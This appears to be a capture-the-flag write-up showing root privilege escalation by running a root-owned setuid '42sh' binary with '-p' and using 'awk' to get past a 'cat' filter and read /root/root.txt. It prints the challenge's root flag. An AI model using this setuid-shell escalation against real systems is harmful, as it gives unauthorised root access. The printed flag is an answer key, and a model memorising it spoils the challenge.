# Prove You're a h4ck3rz: Escaping the 42sh Portal

## Technique used

- Home directory and permission inspection
- Privileged shell binary abuse
- Command execution with preserved privileges
- `awk` used to read the root flag

## Command and output

### 1. Inspecting the `titouan` home directory

After escalating from `www-data` to `titouan`, we inspected the user's home directory:

```bash
$ sudo -u titouan bash -c 'ls -la $HOME'
```

```text
total 1300
drwx------ 1 titouan titouan    4096 Aug 27 09:35 .
drwxr-xr-x 1 root    root       4096 Aug 27 09:35 ..
-rw-r--r-- 1 titouan titouan     220 May  9 11:07 .bash_logout
-rw-r--r-- 1 titouan titouan    3526 May  9 11:07 .bashrc
-rw-r--r-- 1 titouan titouan     807 May  9 11:07 .profile
-rwsrwsrwt 1 root    root    1298416 Aug 27 09:35 42sh
-r-------- 1 titouan titouan      30 Jul 23 13:42 user.txt
```

The `/home/titouan/42sh` binary has elevated permission bits and is owned by `root`. This makes it a promising candidate for the next privilege escalation step.

### 2. Using `42sh` to read the root flag

We launched the binary as `titouan` with the `-p` option to preserve its privileges. Since `cat` was filtered by the shell panel, `awk` was used to read the file instead:

```bash
$ sudo -u titouan /home/titouan/42sh -p -c 'awk 1 /root/root.txt'
```

```text
EPI{K0l0r5_4nD_f4nCY_pR0Mp7_4r3_R34lLY_n3C3554Ry}
```

## Evidence

- Privileged binary: `/home/titouan/42sh`
- Execution command: `sudo -u titouan /home/titouan/42sh -p -c 'awk 1 /root/root.txt'`
- Root flag: `EPI{K0l0r5_4nD_f4nCY_pR0Mp7_4r3_R34lLY_n3C3554Ry}`